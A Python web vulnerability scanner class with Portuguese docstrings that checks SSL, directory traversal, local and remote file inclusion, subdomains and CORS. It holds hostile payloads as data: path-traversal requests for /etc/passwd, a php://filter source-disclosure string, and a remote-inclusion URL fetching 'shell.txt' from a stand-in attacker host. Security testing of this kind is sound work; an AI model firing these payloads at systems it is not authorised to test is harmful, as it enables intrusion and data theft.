import requests
import socket
import ssl
import subprocess
from typing import List, Dict, Any

class AdvancedScanner:
    def __init__(self):
        self.results = {}

    def check_ssl_security(self, hostname: str) -> Dict[str, Any]:
        """Verifica a segurança do certificado SSL."""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        "status": "secure",
                        "protocol": ssock.version(),
                        "cipher": ssock.cipher(),
                        "cert_expiry": cert['notAfter']
                    }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def check_directory_traversal(self, url: str) -> Dict[str, bool]:
        """Testa vulnerabilidades de Directory Traversal."""
        payloads = ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
        vulnerabilities = []
        
        for payload in payloads:
            try:
                response = requests.get(f"{url}/{payload}", timeout=5)
                if "root:" in response.text:
                    vulnerabilities.append(payload)
            except:
                continue
                
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "payloads_found": vulnerabilities
        }

    def check_file_inclusion(self, url: str) -> Dict[str, bool]:
        """Testa vulnerabilidades de File Inclusion."""
        lfi_payloads = [
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        rfi_payloads = [
            "http://evil.example.com/shell.txt",
            "https://pastebin.com/raw/malicious"
        ]
        
        results = {
            "lfi_vulnerable": False,
            "rfi_vulnerable": False,
            "suspicious_responses": []
        }

        for payload in lfi_payloads + rfi_payloads:
            try:
                response = requests.get(f"{url}?file={payload}", timeout=5)
                if any(sign in response.text for sign in ["root:", "<?php"]):
                    results["suspicious_responses"].append(payload)
                    if payload in lfi_payloads:
                        results["lfi_vulnerable"] = True
                    else:
                        results["rfi_vulnerable"] = True
            except:
                continue

        return results

    def scan_subdomains(self, domain: str) -> List[str]:
        """Realiza uma varredura de subdomínios."""
        common_subdomains = ["www", "mail", "ftp", "admin", "blog", "dev", "test"]
        found_subdomains = []

        for sub in common_subdomains:
            try:
                subdomain = f"{sub}.{domain}"
                socket.gethostbyname(subdomain)
                found_subdomains.append(subdomain)
            except:
                continue

        return found_subdomains

    def check_cors_misconfig(self, url: str) -> Dict[str, bool]:
        """Verifica configurações incorretas de CORS."""
        headers = {
            "Origin": "https://malicious-site.com"
        }
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            cors_header = response.headers.get("Access-Control-Allow-Origin")
            
            return {
                "misconfigured": cors_header == "*" or cors_header == headers["Origin"],
                "allow_origin": cors_header
            }
        except:
            return {"error": "Failed to check CORS configuration"}

    def run_full_scan(self, target: str) -> Dict[str, Any]:
        """Executa uma varredura completa do alvo."""
        self.results = {
            "target": target,
            "ssl_security": self.check_ssl_security(target),
            "directory_traversal": self.check_directory_traversal(f"http://{target}"),
            "file_inclusion": self.check_file_inclusion(f"http://{target}"),
            "subdomains": self.scan_subdomains(target),
            "cors": self.check_cors_misconfig(f"http://{target}")
        }
        return self.results